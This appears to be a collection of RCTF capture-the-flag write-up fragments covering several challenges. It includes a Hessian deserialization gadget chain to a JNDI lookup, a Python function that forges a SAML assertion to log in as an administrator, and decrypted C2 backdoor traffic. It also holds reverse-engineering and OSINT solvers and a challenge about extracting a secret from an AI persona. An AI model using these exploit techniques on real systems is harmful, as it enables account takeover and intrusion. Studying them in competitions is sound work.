com.caucho.hessian.io.Hessian2Input#readObject() java.util.TreeMap#put java.util.TreeMap#compare com.rctf.server.tool.Maybe#compareToorg.springframework.beans.factory.support.AutowireUtils.ObjectFactoryDelegatingInvocationHandler#invokeorg.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean.TargetBeanObjectFactory#getObject org.springframework.jndi.support.SimpleJndiBeanFactory#getBean(java.lang.String) org.springframework.jndi.support.SimpleJndiBeanFactory#getBean(java.lang.String, java.lang.Class<T>) org.springframework.jndi.JndiLocatorSupport#lookup(java.lang.String, java.lang.Class<T>) org.springframework.jndi.JndiTemplate#lookup(java.lang.String) javax.naming.Context#lookup(java.lang.String)
```



```
version--, CVE++++, is it easier now?FROM 1panel/maxkb:v2.3.0COPY flag /root/flagOnline Environment: 👉Click Here👈(Pleasetestlocally first!) HINT: The intended exploit should work on both RootKB(v2.3.1) and RootKB--(v2.3.0). Of course, you don’t have to follow my intended.
```



```
Only administrators can obtain the flagOnline Environmentidp: http://auth.rctf.rois.team/sp: http://auth-flag.rctf.rois.team:26000/题目附件：
```



```
definject_malicious_assertion(saml_response_b64: str, admin_email: str)-> str: xml_bytes = base64.b64decode(saml_response_b64) parser = etree.XMLParser(resolve_entities=False, no_network=True) root = etree.fromstring(xml_bytes, parser) ns = { "samlp":"urn:oasis:names:tc:SAML:2.0:protocol", "saml":"urn:oasis:names:tc:SAML:2.0:assertion", } assertions = root.xpath("//saml:Assertion", namespaces=ns) first_assertion = assertions[0] saml_ns = ns["saml"] malicious = etree.Element(f"{{{saml_ns}}}Assertion") subject = etree.SubElement(malicious,f"{{{saml_ns}}}Subject") nameid = etree.SubElement(subject,f"{{{saml_ns}}}NameID") nameid.text = admin_email parent = first_assertion.getparent() idx = parent.index(first_assertion) parent.insert(idx, malicious) new_xml = etree.tostring(root, encoding="utf-8", xml_declaration=False) returnbase64.b64encode(new_xml).decode()
```



```
RCTF{4re_you_really_an_administrator??!!}
```



```
Let’s Speak Softly Love on 8086Online:http://1.95.196.4:26001/http://1.95.196.4:26002/http://1.95.196.4:26003/The attachments can be downloaded via the following two optional links.https://pan.baidu.com/s/16dthSYT1ETLx1C9rppRQ8w?pwd=njkwhttps://drive.google.com/file/d/1UeqMrgVi0B7UmlYMRrOvI-M3wAgB07aQ/view?usp=sharing
```



```
Speak Softly LoveLet's Speak Softly Love on 8086🎉 Congratulations! You've completed all challenges!Your flag:RCTF{wh3n_8086_s4ng_s0f7ly_0f_l0v3}Challenge 1: Video IDEven with the limited hardware of that era, this small player could still produce surprisingly gentle melodies. Pleasehelpme locate the ID of the original upload of this piece.Video IDCompleted ✓Correct answer!Challenge 2: Code RevisionThe developer behind it has quietly maintained his corner of the netformany years. Pleasehelpme locate the version entryinthe author's own code history where he introduced a safeguard to prevent endless "soft error" loops caused by missing playlist items.Code revisionCompleted ✓Correct answer!Challenge 3: Name-pronunciation URLThe developer has quietly maintained his corner of the net for many years. Please help me locate the full URL that points to the recording in which he pronounces his own name.Full URLCompleted ✓Correct answer!Challenge 4: Donation addressThe developer has quietly maintained his corner of the net for many years — a place filled with personal tools, archived ideas, and even a way to show appreciation if his work ever brought you something valuable. Please help me locate the address he published for donations in digital currency.Donation addressCompleted ✓Correct answer!
```



```
youtube搜toshiba dosmid答案 8ssDGBTssUI
```



```
https://sourceforge.net/p/dosmid/code/178/iftoo many'soft'errors occurina row, dosmid aborts (protects against'soft errors loops', typically with playlist filled with non-existing files)答案 r178
```



```
https://mateusz.viste.fr/ 页面最底下答案 https://mateusz.viste.fr/mateusz.ogg
```



```
在主页 https://mateusz.viste.fr/ 找到 gopher://gopher.viste.frhttps://gopherproxy.meulie.net/gopher.viste.fr/1/donate答案 16TofYbGd86C7S6JuAuhGkX4fbmC9QtzwT
```



```
Background StoryDuring a red team exercise, Loki the Trickster successfully compromised Thor’s machine and planted a backdoor. Thor discovered the anomaly and identified Loki’s C2 server IP, but as a script kiddie, he only knows how to run directory scanners and has no idea how to counterattack.In desperation, Thor captured all the network traffic and came to youforhelp. The AllFather Odin watches from his throne, curious to seeifyou possess the wisdom to unravel Loki’s schemes.“In the halls of Asgard, deception wears many faces. Even Huginn and Muninn, Odin’s ravens, struggle to discern truth from illusion when Loki weaves his tricks.”Online：http://1.95.68.35:26001/http://1.95.68.35:26002/http://1.95.68.35:26003/题目附件：
```



```
import astfrom base64 import b64decodeimport binasciifrom Crypto.Cipher import AESaesKey ="WzUsMTM5LDI0NSwyMjAsMjMxLDQ2LDIzNCwxNDYsMjQ4LDIxMSwyLDIxMywyLDE2NSw5OCwxMTgsMTAzLDE2MiwzLDE1MCw0LDUzLDE3OSwxOTQsODQsMjA3LDQ1LDI0NSw4OCwxNzksMTkzLDEwMV0="aesIv ="WzEyNCwyMzIsMjU0LDE5LDI1MCw0OSw1MCw4MywyMjksMjQ0LDI4LDIyMiw4MywzMywyMDIsNl0="def b642str(data): data =''.join([hex(_).replace("0x","").zfill(2)for_inast.literal_eval(b64decode(data).decode("utf-8"))]) returndatakey = binascii.unhexlify(b642str(aesKey))iv = binascii.unhexlify(b642str(aesIv))def encrypt(data): cipher = AES.new(key, AES.MODE_CBC, iv) decrypted_bytes = cipher.decrypt(binascii.unhexlify(b64decode(data).decode("utf-8"))) returndecrypted_bytes.decode('utf-8')Datas =# 数据太长不贴了foriinDatas: print(encrypt(i).strip())
```



```
{"systemInfo":{"hostname":"DESKTOP-EO5QI9P","username":"dell","osType":"Windows_NT","osRelease":"10.0.17763","platform":"win32","arch":"x64","PID":6796,"Process":"C:\Users\dell\Desktop\Microsoft VS Code\Code.exe","IP":["192.168.77.134"],"mode":"egress"},"timestamp":1763017667381}
```



```
C:\Users\dell\Desktop\Microsoft VS Code\Code.exe
```



```
{"command":"pwd","outputChannel":"o-1xk645wxtri","taskId":"c0c6125e"}
```



```
{"command":"drives","outputChannel":"o-wup8k5bgwft","taskId":"44Drive: C:Created: Fri Sep 14 2018 23:09:26 GMT-0700 (Pacific Daylight Time)Modified: Wed Nov 12 2025 22:52:43 GMT-0800 (Pacific Standard Time)---
```



```
{"outputChannel":"o-2ggeq7qpt2u","taskId":"shell-upload-1763017722153","fileId":"dd45c631-ec19-40b1-aa1b-e3dea35d21ae","filePath":"C:\Users\dell\Desktop\Microsoft VS Code\fllllag.txt","fileData":"UkNURnt0aGV5IGFsd2F5cyBzYXkgUmF2ZW4gaXMgaW5hdXNwaWNpb3VzfQ=="}File saved to C:UsersdellDesktopMicrosoft VS Codefllllag.txt (43 bytes)
```



```
Welcome to “The Alchemist’s Cage.” In this forge, you’ll challenge a paranoid AI Alchemist to create a Golem from a “soul seed,” forging a flawed being sworn to protect a secret. You have only five turns to interrogate your creation, exploit its personality flaw, and coax out the hidden rune it guards. Uncover the secret before the Golem is shattered and its knowledge is lost forever.Online Environment: 👉Click Here👈 ⚠ Notice: A 503 page means the service is still being created — pleasewaitpatiently.
```



```
"Asgard fallen down, fallen down, fallen down,Asgard fallen down, my fair lightning…"The first breach was a lesson. The second breach was a catastrophe.Loki returned, not with louder thunder, but with deeper silence. He learned from his defeat—learned that the best place to hide is notindarkness, butinthe blinding light of chaos. This time, when he struck, he did sowhileThor himself hammered at his gates.Thor, determined to turn the tables, launched a full assault on Loki’s C2 infrastructure. Vulnerability scanners roared like Mjölnir’s thunder. Directory brute-forcers swept like Heimdall’s gaze across every path. The network burned with the fury of Asgard’s vengeance.But Loki had already won.Online：http://1.95.68.35:26011/http://1.95.68.35:26012/http://1.95.68.35:26013/题目附件：
```



```
http.request.uri =="/contact"
```



```
<!-- build:20251115-VdmEJO6SDkVWYkSQD4dPfLnvkmqRUCvrELipO14dfVs= --><!-- version:1.2.3-EjureNfe2IA6jFEZEih84w== -->
```



```
http.request.method =="POST"and http.request.uri =="/contact"
```



```
某初创公司新写了一个Vault，但是上线的第一天就被黑客入侵，但是公司内的工程师看了很久都不知道漏洞在哪，请你来帮忙找找A certain startup has developed a new Vault, but it was hacked on the very first day it went online. The engineersinthe company have been looking into itfora long time but still can’t figure outwherethe vulnerability is. Pleasehelpthem find it.Online Environment1.95.2.49 26000-26002题目附件：
```



```
solution.mv size 452=== test port 26001 ===banner: b'[SERVER] solution:'chunk: b'[SERVER] Challenge modules published at: 982201612e1d635515eec8e8b8bdc65cc120931543090e9efde3e92cdd61c247'chunk: b'[SERVER] Solution published at 824126568296ff8b4b69b68d68f73a2e5bbb7f4b360c045984c016a7b778b3a0[SERVER] Congrats, flag: RCTF{0dea5727-1e94-4f74-b46e-634b25e48572}'closed
```



```
无数节点一条岔路两次输入一个真相Countless nodes.Binary ForkTwo inputs.One truth.题目附件：
```



```
void__fastcallsub_11E920(){// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND] v0 = path_array; v17 = __readfsqword(0x28u); v1 = (uint32_t*)&v15;memset(&v15,0,sizeof(v15)); v15.next_node_id =1;for( node_id =1; ; node_id = v15.next_node_id ) { v3 = node_id -1; v4 = code1_array[v3]; if( !v4 ) { puts("Missed the Jump!"); exit(0); } v5 =0; *(_OWORD *)key =0; do { key[v5] = ~TEA_KEY[v5]; ++v5; } while( v5 !=16); v14 =0; v6 = (void*)tea_decrypt(v4, size1_array[v3], key, &v14); if( (int)running_code(v6, v14, &v15, (__int64)g_flag) <0) break; if( v15.dword4 ==2) { __printf_chk(1,"running code error n"); return; } v7 = v15.next_node_id -1; v8 = code2_array[v7]; if( !v8 ) { puts("Empty Path"); exit(0); } for( j =0; j !=16; ++j ) key[j] = ~AES_KEY[j]; v14 =0; v10 = aes_decrypt(v8, size2_array[v7], (__int64)key, &v14); running_code2(v10, v14, (__int64)&v15, v15.next_node_id, *v0); if( v15.dword0 ==2) { // 6113 if( v15.qword8 == qword_934C88 ) { if( !v15.count2 ) gotoLABEL_24; // hash v11 =0x14650FB0739D0383LL; do { v12 = (int)v1[6]; ++v1; v13 = v11 ^ v12; v11 =0x100000001B3LL * v13; } while( (uint32_t*)((char*)&v15 +4* v15.count2) != v1 ); if( v13 ==0x18C3D466784B5624LL && (g_flag[14] ^ (unsigned__int8)((g_flag[4] >>1) +2* g_flag[0])) ==0xFFFFFFD0) { __printf_chk(1,"you get flag %s", (constchar*)g_flag); putc(10,stdout); } else {LABEL_24: __printf_chk(1,"final check failed!n"); } } return; } if( ++v0 == (unsigned__int8 *)&dword_F64BA0 ) return; }}
```



```
importstructimporthexdumpfromCrypto.CipherimportAESfromCrypto.Util.Paddingimportunpaddeftea_decrypt(data, key): outbuf = bytearray(len(data)) foroffinrange(0, len(data),8): v0, v1 = struct.unpack_from('>2I', data, off) sum_ =0xC6EF3720 foriinrange(32): v1 -= (sum_ + v0) ^ (key[3] + (v0 >>5)) ^ (key[2] +16* v0); v1 &=0xFFFFFFFF v0 -= (v1 + sum_) ^ (key[1] + (v1 >>5)) ^ (key[0] +16* v1); v0 &=0xFFFFFFFF sum_ +=0x61C88647 sum_ &=0xFFFFFFFF struct.pack_into('>2I', outbuf, off, v0, v1) returnunpad(bytes(outbuf),8)tea_key = [0xB5,0x8A,0x92,0x8F,0xA0,0x97,0xCE,0x98,0x97,0xA0,0xCD,0xA0,0x8C,0x94,0x86,0xDE]foriinrange(16): tea_key[i] = (~tea_key[i])&0xFFtea_key = list(struct.unpack_from('>4I', bytes(tea_key)))aes_key = [0xB3,0xCE,0x91,0x94,0xA0,0xCD,0xA0,0x8B,0x97,0xCC,0xA0,0xB6,0xB1,0xCC,0xAB,0xDE]foriinrange(16): aes_key[i] = (~aes_key[i])&0xFFaes_key = bytes(aes_key)aes = AES.new(aes_key, AES.MODE_ECB)tea_code_array =0x934CA0tea_size_array =0x182040aes_code_array =0xF318E0aes_size_array =0x9A6960foriinrange(58264): addr = ida_bytes.get_qword(tea_code_array+i*8) size = ida_bytes.get_qword(tea_size_array+i*8) ifaddrandsize: code = ida_bytes.get_bytes(addr, size) code = tea_decrypt(code, tea_key) ida_bytes.patch_bytes(addr, code)foriinrange(26057): addr = ida_bytes.get_qword(aes_code_array+i*8) size = ida_bytes.get_qword(aes_size_array+i*8) ifaddrandsize: print(hex(addr)) code = ida_bytes.get_bytes(addr, size) code = unpad(aes.decrypt(code), aes.block_size) ida_bytes.patch_bytes(addr, code)
```



```
tea_code_array =0x934CA0tea_size_array =0x182040outbuf =''foriinrange(58264): addr = ida_bytes.get_qword(tea_code_array+i*8) size = ida_bytes.get_qword(tea_size_array+i*8) ifaddrandsize: func = idaapi.get_func(addr) code = str(idaapi.decompile(func,None, idaapi.DECOMP_NO_CACHE)) print(i) outbuf +='#'*80+f'{i}#n' outbuf += codeopen('./code1.txt','w').write(outbuf)aes_code_array =0xF318E0aes_size_array =0x9A6960outbuf =''foriinrange(26057): addr = ida_bytes.get_qword(aes_code_array+i*8) size = ida_bytes.get_qword(aes_size_array+i*8) ifaddrandsize: func = idaapi.get_func(addr) code = str(idaapi.decompile(func,None, idaapi.DECOMP_NO_CACHE)) print(i) outbuf +='#'*80+f'{i}#n' outbuf += codeopen('./code2.txt','w').write(outbuf)
```



```
################################################################################0#int __fastcall sub_934B20(st1 *a1, uint8_t *a2){intcount2;// eaxunsignedintv4;// [rsp+28h] [rbp-8h]unsignedintv5;// [rsp+28h] [rbp-8h]if( a1->dword0 ==1) { a1->qword8 +=9030LL; if( a1->count2 <=0x3FFu ) { count2 = a1->count2; a1->count2 = count2 +1; a1->field_18[count2] =9030; } }if( a1->dword0 ) { if( a1->dword0 ==1) { v4 = ((a2[8] <<8) | a2[10]) -1640531527; v5 =-1028477387* ((-2048144789* (v4 ^ HIWORD(v4))) ^ ((-2048144789* (v4 ^ HIWORD(v4))) >>13)); if( (HIWORD(v5) ^ (unsigned__int16)v5) ==-16905) a1->dword4 =1; else a1->dword4 =2; } }else { a1->dword4 =0; } a1->next_node_id =1;return0;}################################################################################1#int __fastcall sub_934A40(st1 *a1, uint8_t *a2){intcount2;// eaxif( a1->dword0 ==1) { a1->qword8 -=3127LL; if( a1->count2 <=0x3FFu ) { count2 = a1->count2; a1->count2 = count2 +1; a1->field_18[count2] =-3127; } }if( a1->dword0 ) { if( a1->dword0 ==1) a1->dword4 =2; }else { a1->dword4 =0; } a1->next_node_id =2;return0;}
```



```
################################################################################0#void __fastcall sub_F317C0(st1 *a1, int a2, char a3){intv3;// [rsp+14h] [rbp-1Ch]unsigned__int64 v4;// [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u);if( (a3 &1) !=0) { if( !a1->dword0 ) a1->dword0 =1; }elseif( a1->dword0 ==1) { a1->dword0 =2; gotoLABEL_10; }if( (a3 &2) !=0) v3 =3;else v3 =2; a1->next_node_id = v3; ++a1->count;LABEL_10:if( v4 != __readfsqword(0x28u) ) ((void(*)(void))loc_874B22)();}################################################################################1#void __fastcall sub_F316A0(st1 *a1, int a2, char a3){intv3;// [rsp+14h] [rbp-1Ch]unsigned__int64 v4;// [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u);if( (a3 &1) !=0) { if( !a1->dword0 ) a1->dword0 =1; }elseif( a1->dword0 ==1) { a1->dword0 =2; gotoLABEL_10; }if( (a3 &2) !=0) v3 =5;else v3 =4; a1->next_node_id = v3; ++a1->count;LABEL_10:if( v4 != __readfsqword(0x28u) ) ((void(*)(void))loc_8748E7)();}
```



```
importrefromitertoolsimportproductcode1 = {}code1_array = open('./code1.txt','r').read().split('#'*80)foriinrange(len(code1_array)): item = code1_array[i] ifnotitem: continue idx, code = item.split(' #n') idx = int(idx,10) code1[idx] = codecode2 = {}code2_array = open('./code2.txt','r').read().split('#'*80)foriinrange(len(code2_array)): item = code2_array[i] ifnotitem: continue idx, code = item.split(' #n') idx = int(idx,10) code2[idx] = codeclassNodeA: def__init__(self, node_index, value, next_node_id, trap): self.node_index = node_index self.value = value self.next_node_id = next_node_id self.trap = trapclassNodeB: def__init__(self, node_index, node_left, node_right): self.node_index = node_index self.node_left = node_left self.node_right = node_rightpath_array = [0]*1024print('ok')nodes1: dict[NodeA] = {}nodes2: dict[NodeB] = {}fork, vincode1.items(): value, = re.findall(r'[count2] = ([-xdABCDEF]+);', v) value = int(value,0) # print(k, value) trap ='a1->dword4 = 1;'notinv next_node_id, = re.findall(r'next_node_id = ([-xdABCDEF]+);', v) next_node_id = int(next_node_id,0) nodes1[k] = NodeA(k, value, next_node_id, trap)fork, vincode2.items(): res = re.findall(r'v3 = ([-d]+);', v) iflen(res) ==2: right, left = int(res[0]), int(res[1]) else: left, right =-1,-1 nodes2[k] = NodeB(k, left, right)deftest_hash(arr: list[int]): # v11 = 0x14650FB0739D0383LL; # do # { # v12 = (int)v1[6]; # ++v1; # v13 = v11 ^ v12; # v11 = 0x100000001B3LL * v13; # } v11 =0x14650FB0739D0383 v13 =0 foriinrange(len(arr)): v13 = v11 ^ (arr[i]&(2**64-1)) v11 = (0x100000001B3* v13) & (2**64-1) returnv13defbf_hash(arr, target): # print('test') forcinproduct(['0','1'], repeat=len(arr)): c = list(c) new_arr = [] node_seq = [] foriinrange(len(c)): ifc[i] =='1': new_arr.append(nodes1[arr[i]].value) node_seq.append(arr[i]) ifsum(new_arr) ==6113: # print('sum found!!!', new_arr) iftest_hash(new_arr) == target: print('found!!!', new_arr, node_seq)defdfs(current, record, path): node: NodeA = nodes1.get(current-1,None) ifnotnode: return node2: NodeB = nodes2.get(node.next_node_id-1,None) ifnotnode2: return ifnotnode.trap: new_record = record+[node.node_index] else: new_record = record[:] bf_hash(new_record,0x18C3D466784B5624) ifnode2.node_left !=-1: dfs(node2.node_left, new_record[:], path+'0') ifnode2.node_right !=-1: dfs(node2.node_right, new_record[:], path+'2')dfs(1, [],"")print('finish')
```



```
# found!!!# [5783, -7171, -1733, -3415, 7703, -8204, 2875, 7495, 7641, -183, -7455, 3473, 2466, -17, 2740, -5885]# [23, 41, 65, 105, 170, 268, 418, 634, 961, 1456, 2187, 3312, 4990, 7538, 11278, 16846]
```



```
fromclaripyimport*s = Solver()flag = [BVS('',8)foriinrange(17)]foriinrange(len(flag)): s.add(flag[i] >32) s.add(flag[i] <=126)'''23, if ( (unsigned __int8)(((a2[9] >> 1) + 2 * a2[12]) ^ a2[6]) == 0xD9 ) a1->dword4 = 1; else a1->dword4 = 2;41, v4 = ((a2[6] << 8) | a2[15]) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (uint16_t)v5) == -30629 ) a1->dword4 = 1; else a1->dword4 = 2;65, if ( (unsigned __int8)((a2[3] * (a2[8] + 3)) ^ (2 * a2[5])) == 0xB4 ) a1->dword4 = 1; else a1->dword4 = 2;105, if ( (unsigned __int8)(((3 * a2[9]) ^ (a2[6] + a2[2])) + 17) == 113 ) a1->dword4 = 1; else a1->dword4 = 2;170, if ( (unsigned __int8)((a2[4] ^ a2[10]) + 2 * a2[5]) == 247 ) a1->dword4 = 1; else a1->dword4 = 2;268, v4 = ((a2[10] << 8) | a2[13]) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (uint16_t)v5) == 5086 ) a1->dword4 = 1; else a1->dword4 = 2;418, if ( (unsigned __int8)((a2[4] * (a2[7] + 3)) ^ (2 * a2[16])) == 0x25 ) a1->dword4 = 1; else a1->dword4 = 2;634, if ( a2[8] == (a2[1] == 3) ) a1->dword4 = 2; else a1->dword4 = 1;961, v4 = ((a2[11] << 8) | a2[2]) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (uint16_t)v5) == -9804 )1456, (unsigned __int8)((a2[10] * (a2[15] + 3)) ^ (2 * a2[11])) == 0x642187, if ( (unsigned __int8)(((3 * a2[11]) ^ (a2[1] + a2[16])) + 17) == 241 )3312, if ( (unsigned __int8)((a2[1] ^ a2[2]) + 2 * a2[16]) == 13 )4990, v4 = ((a2[0] << 8) | a2[13]) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (uint16_t)v5) == -6579 )7538, if ( (unsigned __int8)((a2[0] * (a2[7] + 3)) ^ (2 * a2[16])) == 0x91 )11278, if ( (a2[14] ^ a2[2]) == 84 )16846 v4 = ((a2[0] << 8) | a2[2]) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (uint16_t)v5) == -15395 )#include<stdint.h>#include<stdio.h>#include"defs.h"int main() { unsigned int v4; unsigned int v5; for (int i = 32; i < 127; i++) { for (int j = 32; j < 127; j++) { uint8_t a = i; uint8_t b = j; v4 = ((a << 8) | b) - 1640531527; v5 = -1028477387 * ((-2048144789 * (v4 ^ HIWORD(v4))) ^ ((-2048144789 * (v4 ^ HIWORD(v4))) >> 13)); if ( (HIWORD(v5) ^ (unsigned __int16)v5) == (-15395&0xFFFF) ) { printf("%d %d %c %cn", i, j, i, j); } } } printf("?n");}'''a2 = flags.add((((a2[9].LShR(1)) +2* a2[12]) ^ a2[6]) ==0xD9)# 23s.add(And(a2[6] ==76, a2[15] ==78))# 41s.add(((a2[3] * (a2[8] +3)) ^ (2* a2[5])) ==0xB4)# 65s.add((((3* a2[9]) ^ (a2[6] + a2[2])) +17) ==113)# 105s.add(((a2[4] ^ a2[10]) +2* a2[5]) ==247)# 170s.add(And(a2[10] ==116, a2[13] ==95))# 268s.add(((a2[4] * (a2[7] +3)) ^ (2* a2[16])) ==0x25)# 418# ! (a2[8] == (a2[1] == 3)) # 634s.add(And(a2[11] ==104, a2[2] ==49))# 961s.add(((a2[10] * (a2[15] +3)) ^ (2* a2[11])) ==0x64)# 1456s.add((((3* a2[11]) ^ (a2[1] + a2[16])) +17) ==241)# 2187s.add(((a2[1] ^ a2[2]) +2* a2[16]) ==13)# 3312s.add(And(a2[0] ==67, a2[13] ==95))# 4490s.add(((a2[0] * (a2[7] +3)) ^ (2* a2[16])) ==0x91)# 7538s.add((a2[14] ^ a2[2]) ==84)# 11278s.add(And(a2[0] ==67, a2[2] ==49))# 16846s.add((a2[14] ^ ((a2[4].LShR(1)) + (a2[0]<<1))) ==0xD0)fori, xinenumerate(s.batch_eval(flag,100)): print(i, bytes(x))# Ct1l_fL0w_th3_eNd# RCTF{Ct1l_fL0w_th3_eNd}
```



```
I found this VM and a ROM. It smells like an onion… I think there are layers.Can you peel them all back to find the flag?题目附件：
```



```
...case0x27: op1, op2 = struct.unpack_from('<BB', code, pc) pc +=2 line +=f'r{op1}<<={op2}' regs[op1] <<= op2 regs[op1] &=2**64-1 flag = regs[op1] ==0 asm_code +=f'shl{get_reg_name(op1)},{op2}'case0x29: op1, op2 = struct.unpack_from('<BQ', code, pc) pc +=9 line +=f'r{op1}^={hex(op2)}' regs[op1] ^= op2 flag = regs[op1] == op2 asm_code +=f'movabs rax,{hex(op2)}; xor{get_reg_name(op1)}, rax'case0x2a: op1, op2 = struct.unpack_from('<BQ', code, pc) pc +=9 line +=f'r{op1}&={hex(op2)}' regs[op1] &= op2 flag = regs[op1] ==0 asm_code +=f'movabs rax,{hex(op2)}; and{get_reg_name(op1)}, rax'case0x2B: op1, op2 = struct.unpack_from('<BB', code, pc) pc +=2 line +=f'r{op1}= m_{field_02:04X}[r{op2}]' asm_code +=f'mov{get_reg_name(op1)}b, byte ptr [rsi+{get_reg_name(op2)}]'case0x2C: op1, op2 = struct.unpack_from('<BB', code, pc) pc +=2 line +=f'm_{field_02:04X}[r{op2}] = r{op1}' asm_code +=f'mov byte ptr [rsi+{get_reg_name(op2)}],{get_reg_name(op1)}b'...
```



```
L_0110: | 81 | mem[1] = 0x104 报错...L_02B8: | 81 | mem[16] = 0x116 rc4 VM字节码解密...L_05A4: | 81 | mem[32] = 0x2be 加密
```



```
L_05A9: | 11 | field_00 = 0xe000L_05AC: | 18 | r0 = m_E000[16]
```



```
L_06D5: | 11 | field_00 = 0x7200L_06D8: | 16 | r1 = 0x36b1cc9fe433713dL_06E2: | 19 | m_7200[0] = r1L_06E4: | 84 | push r0L_06E6: | 16 | r0 = 0x8L_06F0: | 1F | field_00 += u32(r0)L_06F2: | 85 | pop r0L_06F4: | 16 | r1 = 0xf97646d69c84ebd8L_06FE: | 19 | m_7208[0] = r1L_0700: | 11 | field_00 = 0x7200L_0703: | 82 | call mem[32]L_0705: | 32 | flag = r0 == 0xda19ba6b81c83f61L_070F: | 03 |if(flag) goto L_0715L_0712: | 82 | call mem[1]L_0714: | FF |exitL_0715: | 17 | r0 = r5L_0718: | 12 | field_02 = 0x72aL_071B: | 16 | r1 = 0x6057L_0725: | 82 | call mem[16]L_0727: | 01 | goto L_072A
```



```
defrol32(v, s):return((v << s) | (v >> (32-s))) &0xFFFFFFFFdefror32(v, s):return((v >> s) | (v << (32-s))) &0xFFFFFFFFdefencrypt(key, inp): v1 = (inp >>32) &0xFFFFFFFF# HIDWORD(inp) v0 = inp &0xFFFFFFFF# (unsigned int)inp k0 = key[0] &0xFFFFFFFF# (unsigned int)*v0 k1 = (key[1] >>32) &0xFFFFFFFF# HIDWORD(v0[1]) k2 = (key[0] >>32) &0xFFFFFFFF# HIDWORD(*v0) k3 = key[1] &0xFFFFFFFF# (unsigned int)v0[1] forkinrange(26): v0 = k0 ^ (ror32(v0,8) + v1) v0 &=0xFFFFFFFF v1 = v0 ^ rol32(v1,3) t = k ^ (ror32(k2,8) + k0) t &=0xFFFFFFFF k0 = (t &0xFFFFFFFF) ^ rol32(k0,3) k0 &=0xFFFFFFFF k2 = k3 k3 = k1 k1 = t v0 = k0 ^ (ror32(v0,8) + v1) v0 &=0xFFFFFFFF v1 = v0 ^ rol32(v1,3) v0 |= v1 <<32 returnv0defdecrypt(key, ciphertext): v1 = ciphertext >>32 v0 = ciphertext &0xFFFFFFFF k0 = key[0] &0xFFFFFFFF# (unsigned int)*v0 k1 = (key[1] >>32) &0xFFFFFFFF# HIDWORD(v0[1]) k2 = (key[0] >>32) &0xFFFFFFFF# HIDWORD(*v0) k3 = key[1] &0xFFFFFFFF# (unsigned int)v0[1] round_keys = [] forkinrange(27): round_keys.append([k0, k1, k2, k3]) t = k ^ (ror32(k2,8) + k0) t &=0xFFFFFFFF k0 = (t &0xFFFFFFFF) ^ rol32(k0,3) k0 &=0xFFFFFFFF k2 = k3 k3 = k1 k1 = t v1 = ror32(v1 ^ v0,3) t1 = ((v0 ^ round_keys[-1][0]) - v1) &0xFFFFFFFF v0 = rol32(t1,8) forkinrange(25,-1,-1): v1 = ror32(v0 ^ v1,3) t2 = ((v0 ^ round_keys[k][0]) - v1) &0xFFFFFFFF v0 = rol32(t2,8) returnv1<<32|v0
```



```
fromCrypto.CipherimportARC4importstructfromtest_2beimportdecryptfromparse_vm3importget_disasmfrompprintimportpprintrom = open('./full_vmcode','rb').read()code = bytearray(0x10000)foriinrange(len(rom)): code[i] = rom[i]defdecrypt_code(off, size, key): key = struct.pack('<Q', key) rc4 = ARC4.new(key) out = rc4.encrypt(code[off:off+size]) foriinrange(len(out)): code[off+i] = out[i]next_layer_addr =0x5a9input_keys = [0]*50foriinrange(50): lines = get_disasm(code, next_layer_addr) pprint(lines) input_key_index = (int(lines[1][lines[1].find('[')+1:-1]))//8 fkey = [0,0] xor_key = [] add_key = [] alu_ops = [] alu_ops_finish =False foriinrange(len(lines)): if'call mem[1]'inlines[i]: target = int(lines[i-2].split(' ')[-1],16) smc_addr = int(lines[i-1][-4:],16) print(hex(target), hex(smc_addr)) elif'm_7200[0] = 'inlines[i]: fkey[0] = int(lines[i-1].split(' ')[-1],16) elif'm_7208[0] = 'inlines[i]: fkey[1] = int(lines[i-1].split(' ')[-1],16) elif'^= 0xffffffffffffffff'notinlines[i]and' ^= 0x'inlines[i]: alu_ops.append(('xor', int(lines[i].split(' ')[-1],16))) elif' | r'inlines[i]and' = 0x'inlines[i]: v = int(lines[i].split(' ')[-1],16) ifv >0x111111andnotalu_ops_finish: print('test', lines[i]) if'field_'inlines[i-1]: alu_ops_finish =True elif'^= 0xffffffffffffffff'notinlines[i+1]: alu_ops.append(('add', int(lines[i].split(' ')[-1],16))) else: alu_ops.append(('sub', int(lines[i].split(' ')[-1],16))) key = decrypt(fkey, target) forop, valueinreversed(alu_ops): ifop =='sub': key += value elifop =='add': key -= value elifop =='xor': key ^= value key &=0xFFFFFFFFFFFFFFFF lines_smc = get_disasm(code, smc_addr) pprint(lines_smc) off = int(lines_smc[1].split(' ')[-1],16) size = int(lines_smc[2].split(' ')[-1],16) print(hex(off), hex(size)) input_keys[input_key_index] = key decrypt_code(off, size, key) print('') next_layer_addr = int(lines_smc[-1][-4:],16)lines = get_disasm(code, next_layer_addr)pprint(lines)if0notininput_keys: print('solved')print(input_keys)
```



```
